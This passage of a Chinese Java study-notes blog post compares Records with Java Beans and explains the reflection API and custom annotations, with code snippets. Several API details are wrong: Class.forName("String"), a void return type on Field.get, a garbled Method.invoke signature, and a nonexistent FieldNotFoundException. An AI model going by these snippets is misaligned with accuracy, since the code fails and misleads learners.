function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的 <code>Person</code> 类就是合格的 Java Bean（注：<code>Serializable</code> 接口已经在 Java 笔记1 中详细介绍）。</p><h2 id="3-3-Java-Record-与-Java-Bean-的对比"><a href="#3-3-Java-Record-与-Java-Bean-的对比" class="headerlink" title="3.3 Java Record 与 Java Bean 的对比"></a>3.3 Java Record 与 Java Bean 的对比</h2><div class="table-container"><table><thead><tr><th>Java Record</th><th>Java Bean</th></tr></thead><tbody><tr><td>追求不可变数据类型、数据结果表示</td><td>追求数据传输便捷性、数据访问接口规范性</td></tr><tr><td>Java 14+ 使用关键字 record 辅助定义</td><td>纯手工实现约定</td></tr><tr><td>final class，不可被继承，也没有被继承需求</td><td>普通 class，可以被继承</td></tr><tr><td>常用于存放、比较 和 展示数据结果</td><td>常用于完成如数据传输一类的业务逻辑</td></tr></tbody></table></div><h1 id="Chapter-4-反射"><a href="#Chapter-4-反射" class="headerlink" title="Chapter 4. 反射"></a>Chapter 4. 反射</h1><p>Java 中的反射机制是什么？</p><p><img src="imgs/CompileAndExplain.png"></p><p>复习一下 Java 的运行过程。我们知道，Java 虚拟机是一种解释器，是解释 Java 字节码（*.class）的一种程序。其大致运行过程如下：</p><p>运行<strong>类加载器</strong>（ClassLoader）将字节码加载到内存中 —-&gt; 运行<strong>字节码验证器</strong>强制检查 Java 程序合法性和安全性，不符合安全规范的不予运行 —-&gt; 读取内存中的字节码逐句解释为机器码执行；</p><p>可以说，在 Java 源文件编译为字节码之后，就形成了一个个 <code>*.class</code> 文件。这里的每个 <code>*.class</code> 文件都对应着这个类型的必要信息。在 Java 虚拟机中将这些字节码加载到内存中，构建了这个类对应的特殊的表示对象（称为 <code>Class</code> 对象）。这样在引用到这个类的位置就能正确地给出行为。</p><blockquote><p>注意，在 Java 中，<code>Class</code>（首字母大写，和关键字 <code>class</code> 是两回事）本身就是一个类型，是承载类的信息的类（元类，meta-class），它的实例对象就叫 <code>Class</code> 对象。</p></blockquote><p>而所谓的反射，可以说是上面的过程的运行时逆过程：</p><p><u><strong>Java 的反射就是从加载到内存中的 <code>Class</code> 对象，反向获取其中的信息</strong></u>（或者说，反向映射）。</p><h2 id="4-1-反射的意义使用场景"><a href="#4-1-反射的意义使用场景" class="headerlink" title="4.1 反射的意义使用场景"></a>4.1 反射的意义使用场景</h2><p>不过在介绍反射之前，首先谈谈它的坏处：</p><ul><li>破坏了类的封装性（因为反射是从 <code>Class</code> 对象反向获取信息，因此突破了类型可见性修饰符的约束，可以访问某个类的私有成员）；</li><li><p>运行时确定类型，性能肯定不好，丢掉了静态类型语言的性能优势；</p></li><li><p>运行安全问题。</p></li></ul><p>如此重要的缺点，已经注定了 Java 的反射机制不应该被随便使用，并且大部分场合下并不适合使用反射。</p><p>但是因为反射的重要功能，少数场合又不得不用。举几个例子：</p><ul><li>Java codelinter 静态类型代码检查。比如 IDEA 的 LSP Server 在探查某个对象的方法和属性的时候（你在 IDEA 里写个对象，后面加个点就能弹出一堆方法和属性提示），除了分析上下文定义的方法以外，一种重要的手段就是通过反射分析；</li><li>大型框架（例如 Springboot）很多都是配置化的（例如通过 XML 文件配置 Bean），为了保证框架的通用性，可能需要根据配置文件加载不同的类或者对象、调用不同的方法。这个时候就必须使用到反射了，它可以完成 “运行时动态加载需要的加载的对象” 的任务；</li><li>Java 加载某些数据库驱动的时候，需要运行时动态构建类型信息，使用时就要用反射机制；</li><li>某些注解的行为需要反射（下一章 “注解” 所需要了解的知识）。</li></ul><h2 id="4-2-反射-API"><a href="#4-2-反射-API" class="headerlink" title="4.2 反射 API"></a>4.2 反射 API</h2><p>了解它的地位后，在开始使用它。使用 Java 的反射就是使用 <code>java.lang.Class</code> 和 <code>java.lang.reflect.*</code> 的所有 API。</p><p>首先列出可能用到的类型：</p><div class="table-container"><table><thead><tr><th>Java 类型</th><th>类型说明</th></tr></thead><tbody><tr><td><code>Class</code></td><td>用来在内存中描述一个 Java 类（所有继承于 Object 的类）</td></tr><tr><td><code>Constructor</code></td><td>用来在内存中描述一个 Java 类的构造函数信息，包括访问权限和动态调用信息等</td></tr><tr><td><code>Field</code></td><td>用来在内存中描述一个 Java 类或者 Java 接口的数据成员（或者说属性）信息，包括访问权限和动态修改等</td></tr><tr><td><code>Method</code></td><td>用来在内存中描述一个 Java 类或者 Java 接口的成员函数（或者说方法）信息，包括包括访问权限和动态调用信息等</td></tr><tr><td><code>Modifier</code></td><td>用来在内存中描述一个 Java 类或者 Java 接口的所有成员（包括属性、方法）的修饰属性，例如 <code>public/private/static/final/synchronized/abstract</code> 等信息</td></tr></tbody></table></div><h3 id="4-2-1-Class-类型与-Class-实例"><a href="#4-2-1-Class-类型与-Class-实例" class="headerlink" title="4.2.1 Class 类型与 Class 实例"></a>4.2.1 <code>Class</code> 类型与 <code>Class</code> 实例</h3><p>我们知道了，反射需要根据内存中的 <code>Class</code> 对象进行操作，那么怎么得到一个普通类型所对应的 <code>Class</code> 对象呢？Java 提供了 3 种方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;Object&gt; 表示任意类型，只要是 Object 的子类 */</span></span><br><span class="line"><span class="comment">/* &lt;Object Instance&gt; 表示任意类型对应的实例对象 */</span></span><br><span class="line">[Method]             &lt;Object Instance&gt;.getClass() -&gt; Class Instance;</span><br><span class="line">[Static Property]     &lt;Object&gt;.class -&gt; Class Instance;</span><br><span class="line">[Static Method]        Class.forName(String className) -&gt; Class Instance;</span><br></pre></td></tr></table></figure><p>下面以获取 <code>String</code> 类对应的 <code>Class</code> 对象为例。</p><ul><li><p>通过该类（一定继承于基类 <code>Object</code>）的实例 中的 <code>getter</code> 方法：<code>&lt;Object&gt;.getClass()</code>；</p><p>这个方法返回是这个对象所在的类型 的对应 <code>Class</code> 实例对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取的 stringClass 实例对象就是 String 类型在 JVM 内存中对应的 Class 对象 */</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">stringClass</span> <span class="operator">=</span> name.getClass();</span><br></pre></td></tr></table></figure></li><li><p>通过该类的<strong>静态属性</strong>获得这个类所对应的 <code>Class</code> 实例对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">stringClass</span> <span class="operator">=</span> String.class;</span><br></pre></td></tr></table></figure></li><li><p>利用 <code>Class</code> 类型提供的静态方法，通过类名字符串查找当前内存中的 Class 对象；</p><blockquote><p>这种方法最常用，因为使用反射的时候，几乎都是不知道对象、不知道类型定义、只知道类型名的情况。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">stringClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;String&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><p>知道类如何获取某个类型的 <code>Class</code> 对象，那么可以对这个 <code>Class</code> 对象进行哪些操作呢？</p><ul><li><p>判断任意对象是否是这个 <code>Class</code>  对象描述的类的实例，或者其他什么东西：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* obj 是否是这个 Class 对象描述的类型的实例 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">isInstance</span><span class="params">(Object obj)</span>;    <span class="comment">/* [Method] */</span></span><br><span class="line"><span class="comment">/* 这个 Class 对象描述的类型是否是 Interface 类型 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">isInterface</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">isArray</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">isPrimitive</span><span class="params">()</span>;    <span class="comment">/* 判断基本类型 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">isAnnotation</span><span class="params">()</span>;    <span class="comment">/* 判断注解 */</span></span><br></pre></td></tr></table></figure></li></ul><p>下面以这个 <code>Class</code> 类型存放的是普通 Java 类为例，叙述常见的方法。</p><blockquote><p>如果 <code>Class</code> 对象中描述的是注解，那么在下一章 “注解” 进行介绍。</p><p>如果 <code>Class</code> 对象中描述的是接口，那么只能获取一些成员信息，可能能调用一些静态方法或属性。</p></blockquote><ul><li><p>从 <code>Class</code> 对象创建实例（哪怕源码中没有这个类的定义也行，只要内存中有这个 <code>Class</code> 对象）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 按默认构造函数创建实例 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">newInstance</span><span class="params">()</span>;        <span class="comment">/* [Method] */</span></span><br></pre></td></tr></table></figure></li><li><p>获取 <code>Class</code> 对象对应类的构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 获取 Class 对象描述的类型的：所有&quot;公有的&quot;构造方法 */</span></span><br><span class="line"><span class="keyword">public</span> Constructor[] getConstructors();</span><br><span class="line"><span class="comment">/* 获取所有的构造方法(包括私有、受保护、默认、公有) */</span></span><br><span class="line"><span class="keyword">public</span> Constructor[] getDeclaredConstructors();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取指定的构造函数 */</span></span><br><span class="line"><span class="comment">/* 这里的参数列表是各个参数类型对应的 Class 对象！ */</span></span><br><span class="line"><span class="keyword">public</span> Constructor <span class="title function_">getConstructor</span><span class="params">(Class... parameterTypes)</span>;</span><br><span class="line"><span class="keyword">public</span> Constructor <span class="title function_">getDeclaredConstructor</span><span class="params">(Class... parameterTypes)</span>;</span><br></pre></td></tr></table></figure></li><li><p>获取 <code>Class</code> 对象对应类的数据成员（属性，静态修饰不作单独区分）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 获取 Class 对象描述的类型的：所有&quot;公有的&quot;属性 */</span></span><br><span class="line"><span class="keyword">public</span> Field[] getFields();</span><br><span class="line"><span class="comment">/* 获取所有的属性(包括私有、受保护、默认、公有) */</span></span><br><span class="line"><span class="keyword">public</span> Field[] getDeclaredFields();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取指定名称的属性 */</span></span><br><span class="line"><span class="keyword">public</span> Field <span class="title function_">getField</span><span class="params">(String fieldName)</span>;</span><br><span class="line"><span class="keyword">public</span> Field <span class="title function_">getDeclaredField</span><span class="params">(String fieldName)</span>;</span><br></pre></td></tr></table></figure></li><li><p>获取 <code>Class</code> 对象对应类的成员函数（方法，静态修饰不作单独区分）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 获取 Class 对象描述的类型的：所有&quot;公有的&quot;方法 */</span></span><br><span class="line"><span class="keyword">public</span> Method[] getMethods();</span><br><span class="line"><span class="comment">/* 获取所有的属性(包括私有、受保护、默认、公有) */</span></span><br><span class="line"><span class="keyword">public</span> Method[] getDeclaredMethods();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取指定名称的属性 */</span></span><br><span class="line"><span class="comment">/* 和构造函数不一样，这里需要先给定方法名 */</span></span><br><span class="line"><span class="keyword">public</span> Method <span class="title function_">getMethod</span><span class="params">(String methodName, Class... parameterTypes)</span>;</span><br><span class="line"><span class="keyword">public</span> Method <span class="title function_">getDeclaredMethod</span><span class="params">(String methodName, Class... parameterTypes)</span>;</span><br></pre></td></tr></table></figure></li><li><p>获取 <code>Class</code> 对象对应类的修饰符：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 获取类型自身的修饰符 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getModifiers</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-2-2-Constructor-类型"><a href="#4-2-2-Constructor-类型" class="headerlink" title="4.2.2 Constructor 类型"></a>4.2.2 <code>Constructor</code> 类型</h3><p>在介绍 <code>Class</code> 类型时，我们了解了如何得到 <code>Constructor</code>（该类的构造函数信息）对象，那么应该如何操作它？</p><p>最常用的方法是 <strong>调用这个构造函数</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* T 为泛型 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> T <span class="title function_">newInstance</span><span class="params">(Object... parameterTypes)</span>;</span><br></pre></td></tr></table></figure><p>警告：这里的参数类型必须要和取得 <code>Constructor</code> 对象时传入的形参类型一致。否则运行时错误。</p><p>还可以获取 <code>Constructor</code> 的其他信息，具体请看官方文档。</p><h3 id="4-2-3-Field-类型"><a href="#4-2-3-Field-类型" class="headerlink" title="4.2.3 Field 类型"></a>4.2.3 <code>Field</code> 类型</h3><p>在介绍 <code>Class</code> 类型时，我们了解了如何得到 <code>Field</code>（该类的属性）对象，那么应该如何操作它？</p><p>常用的方法是，按查找到的属性信息设置对象属性、读取对象属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(Object target, Object value)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">(Object target)</span>;</span><br></pre></td></tr></table></figure><p>这里为什么要给 <code>target</code> 参数呢？因为我们得到的 <code>Field</code> 对象只是保存了原来类型属性的一部分信息，不能指明这个属性是属于具体哪个对象的。所以取值和设置时需要给定对象。</p><p>警告：这里的 <code>value</code> 必须和取得 <code>Field</code> 对象时原本类型一致，否则运行时错误。</p><p>对于私有成员，想要访问它前需要强制越过可见性修饰符：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(<span class="type">boolean</span> available)</span>;</span><br></pre></td></tr></table></figure><p>可能产生的异常有 <code>FieldNotFoundException</code>，<code>IllegalAccessException</code> 等等；</p><p>还可以获取 <code>Field</code> 的其他信息，具体请看官方文档。</p><h3 id="4-2-4-Method-类型"><a href="#4-2-4-Method-类型" class="headerlink" title="4.2.4 Method 类型"></a>4.2.4 <code>Method</code> 类型</h3><p>在介绍 <code>Class</code> 类型时，我们也了解了如何得到 <code>Method</code>（该类的方法）对象，那么应该如何操作它？</p><p>常用的方法是，调用它：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> ObjectObject <span class="title function_">invoke</span><span class="params">(Object target, Object... parameters)</span>;</span><br></pre></td></tr></table></figure><p>如果是私有方法，也需要通过 <code>setAccessible</code> 调整访问可见性。</p><p>还可以获取 <code>Method</code> 的其他信息，具体请看官方文档。</p><h3 id="4-2-5-Modifier-类型"><a href="#4-2-5-Modifier-类型" class="headerlink" title="4.2.5 Modifier 类型"></a>4.2.5 <code>Modifier</code> 类型</h3><p>其实，除了 <code>Class</code> 类型，其他的 <code>Constructor/Field/Method</code> 类型都可以调用 <code>getModifiers()</code> 获取当前字段的修饰符。返回值是 <code>int</code>，但是可以通过 <code>Modifier</code> 静态方法转为可读的字符串：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>可以表示的修饰符不仅有可见性修饰符，还有各种像 <code>native / synchronized / transient / volatile / abstract / final / interface</code> 等等，都可以检查到，使用对应的 <code>isXXX()</code> 实例方法即可。</p><h3 id="4-2-6-反射的使用实例"><a href="#4-2-6-反射的使用实例" class="headerlink" title="4.2.6 反射的使用实例"></a>4.2.6 反射的使用实例</h3><ul><li>反射越过泛型检查；</li><li>大型框架（以 SpringMVC 为例）字段名一类的数据类型配置反射处理相当简洁清晰；</li><li>自定义注解（写 <code>RUNTIME</code> 注解逻辑，下一章详细叙述）；</li></ul><h1 id="Chapter-5-注解"><a href="#Chapter-5-注解" class="headerlink" title="Chapter 5. 注解"></a>Chapter 5. 注解</h1><p>Java 中一种语法称为注解，可能在大部分其他的语言中都有。在 Python / TypeScript 中，这种类似的做法称为 “装饰器”。</p><blockquote><p>严格来说，Java 的注解和 Python / TypeScript 的装饰器的机制不一样。因为前者只是改变了执行方式，而后者相当于是一种语法糖，处理后替换了被装饰的对象。但是它们的语法和最终作用真的很像。</p></blockquote><p>这种做法的特征是，在<u>不改变原代码内容和逻辑</u>的基础上，进行一些修饰和包装（就像给解释器注解这段代码的执行方式一样），使得解释执行（或者编译）这段代码时的方式有些许改变。</p><p>你没看错，“注解“ 这个东西本身，不会对原先的代码的逻辑有任何影响（<u>这段代码编译出的字节码不会变</u>），只是<u>做个标记，告诉即将要读取这个注解的对象（可能是编译器、加载器，或者是程序中的其他代码），用约定好的方式来执行这段代码</u>（比如执行之前、执行之后插入了一些其他流程）。</p><h2 id="5-1-注解的使用和分类"><a href="#5-1-注解的使用和分类" class="headerlink" title="5.1 注解的使用和分类"></a>5.1 注解的使用和分类</h2><p>你也许会在一些代码中见到这样的书写方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Resource(&quot;hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="meta">@Inject</span></span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(<span class="meta">@Param</span> String name)</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@Resource(&quot;Hello&quot;)</code> 是有参数的注解，<code>@PostConstruct / @Override</code> 是无参数的注解；</p><p><code>@Resource(&quot;Hello&quot;)</code> 在这个例子中是修饰类的注解，<code>@PostConstruct / @Override</code> 在这个例子中是修饰方法的注解，<code>@Param</code> 在这个例子中是修饰形参的注解。</p><p>注解的使用语法就这些，无非是无参数的 <code>@&lt;AnnotationName&gt;</code>，或者有参数的 <code>@&lt;AnnotationName&gt;(...)</code>，加在它们所指定的对象头部位置。</p><p>要掌握好注解的使用方法，就先把它们按使用特征分类。一般来说，注解是按处理阶段进行分类：</p><ul><li><p>写给编译器看的注解（称为 <strong>编译时注解，Compile-time Annotation</strong>）。</p><p><u>这类注解不会被编译进入 <code>.class</code> 字节码文件，它们在编译后就被编译器扔掉了</u>；举例：</p><ul><li><code>@Override</code>：让编译器检查该方法是否正确地实现了覆写（C++ <code>override</code> 关键字有同样的功能）；</li><li><code>@SuppressWarnings</code>：告诉编译器忽略此处代码产生的警告。</li></ul></li><li><p>写给 <code>classLoader</code> 或者其他加载时 ~ 运行时的工具看的注解（称为 <strong>加载时注解，Load-time Annotation</strong>）。</p><p><u>这类注解会被编译进入 <code>.class</code> 文件，但加载结束后并不会存在于内存中</u>。这类注解只被一些底层库使用，一般我们不必自己处理。</p><p>比如有些工具会在加载 class 的时候，对 class 做动态修改，实现一些特殊的功能。</p></li><li><p>写给运行时某一部分代码看的注解（称为 <strong>运行时注解，Run-time Annotation</strong>）。</p><p>就算是运行时注解，JVM 也并不会通过注解主动进行一些操作。<u>只有部分代码通过 <strong>反射</strong> 读取指定的注解，进行业务逻辑的执行</u>。</p><p><u>这也是最常用的注解形式，在许多框架中都会出现</u>。</p></li></ul><h2 id="5-2-自定义注解"><a href="#5-2-自定义注解" class="headerlink" title="5.2 自定义注解"></a>5.2 自定义注解</h2><p>有些情况下（比如使用框架），你可能会用很多预先定义的注解，但是你很好奇这些注解是怎么运作的，于是你就要了解，一个注解是如何定义、如何生效（进行处理）的。</p><p>搞清楚一个东西的最好方法就是从头开始做一遍，于是你准备动手搓一个自定义的注解出来。</p><h3 id="5-2-1-注解的定义-和-实质"><a href="#5-2-1-注解的定义-和-实质" class="headerlink" title="5.2.1 注解的定义 和 实质"></a>5.2.1 注解的定义 和 实质</h3><p>Java 规定，注解使用 <code>@interface</code> 关键字定义注解。最基本的语法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyFirstAnnotation &#123;</span><br><span class="line">    <span class="comment">/* 强烈建议为注解的每个数据域都设置一个默认值 */</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">intData</span><span class="params">()</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line">    String <span class="title function_">stringData1</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;info&quot;</span>;</span><br><span class="line">    String <span class="title function_">stringData2</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">/* 建议最常用的数据域名称设置为 value */</span></span><br><span class="line">    String <span class="title function_">value</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注解的定义和 Java 的记录类型一样简洁，<u>只需要声明要传给注解的参数即可（这些参数直接以访问器的形式定义，如上），不需要定义任何处理逻辑！</u></p><p>因为注解的处理交由某些特定的代码完成（下一节介绍），注解的定义本身 <strong>就仅仅是一个 “注解”，或者说等待处理的标识而已</strong>。</p><p>此外，还需要搞清楚一件事：注解的实质就是一个 Java 类型。所有的注解都继承于接口 <code>java.lang.annotation.Annotation</code>；因此，上面的定义方法只不过也是一种语法糖罢了。</p><p>但是，只有这个定义还不够描述这个注解，比如，<strong><u>这个注解是前面分类中的什么类型？应该在什么阶段、被谁处理（生命周期）？允许修饰谁？</u></strong></p><p>这些信息 <strong>可以交给描述注解的注解，也就是元注解（meta-annotation），来完成</strong>。</p><p>Java 标准库中定义了一大批实用的元注解，所以一般不需要我们自己定义元注解，只要知道怎么使用元注解来定义注解就可以了。常用的元注解如下：</p><ul><li><p><code>@Target(&lt;ElementType/ElementTypes[]&gt;)</code> 元注解：<strong>解释当前注解所能修饰的对象类型</strong>。</p><blockquote><p>参数取值：<code>ElementType.TYPE</code>（允许修饰类、接口），<code>ElementType.FIELD</code>（允许修饰属性），<code>ElementType.METHOD</code>（允许修饰方法），<code>ElementType.CONSTRUCTOR</code>（允许修饰构造函数），<code>ElementType.PARAMETER</code>（允许修饰方法的形式参数）；</p></blockquote></li><li><p><code>@Retention([RetentionPolicy])</code> 元注解：<strong>解释当前注解的声明周期（指定注解类型）</strong>。</p><blockquote><p>可选参数取值：<code>RetentionPolicy.SOURCE</code> 编译时注解、<code>RetentionPolicy.CLASS</code> 加载时注解（默认）、<code>RetentionPolicy.RUNTIME</code> 运行时注解；</p></blockquote></li><li><p><code>@Repeatable(&lt;Annotation Class Instance&gt;)</code> 元注解：<strong>解释当前注解是否可以重复注解同一对象</strong>。</p><blockquote><p>要用的话，直接在注解的定义头部加上 <code>@Repeatable(&lt;AnnotationName&gt;.class)</code>；</p><p>这里需要反射方法传入自定义注解类对应的 <code>Class</code> 对象。</p></blockquote></li><li><p><code>@Inherited</code> 元注解：<strong>解释当前注解是否可继承</strong>。当且仅当 <code>@Target</code> 参数为 <code>ElementType.TYPE</code> 时有效。</p><blockquote><p>这个元注解的意思是，当前注解能不能随着继承交给子类。</p></blockquote></li></ul><p>使用示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 这个注解只能修饰方法 */</span></span><br><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyFirstAnnotation &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">intData</span><span class="params">()</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line">    String <span class="title function_">stringData1</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;info&quot;</span>;</span><br><span class="line">    String <span class="title function_">stringData2</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这个注解既能修饰方法，又能修饰属性 */</span></span><br><span class="line"><span class="meta">@Target(&#123;</span></span><br><span class="line"><span class="meta">    ElementType.METHOD,</span></span><br><span class="line"><span class="meta">    ElementType.FIELD</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyFirstAnnotation2 &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">intData</span><span class="params">()</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line">    String <span class="title function_">stringData1</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;info&quot;</span>;</span><br><span class="line">    String <span class="title function_">stringData2</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 可以注解方法和构造函数的 运行时注解 */</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(&#123;</span></span><br><span class="line"><span class="meta">    ElementType.METHOD,</span></span><br><span class="line"><span class="meta">    ElementType.CONSTRUCTOR</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyFirstAnnotation1 &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">intData</span><span class="params">()</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line">    String <span class="title function_">stringData1</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;info&quot;</span>;</span><br><span class="line">    String <span class="title function_">stringData2</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-2-2-运行时注解的处理"><a href="#5-2-2-运行时注解的处理" class="headerlink" title="5.2.2 运行时注解的处理"></a>5.2.2 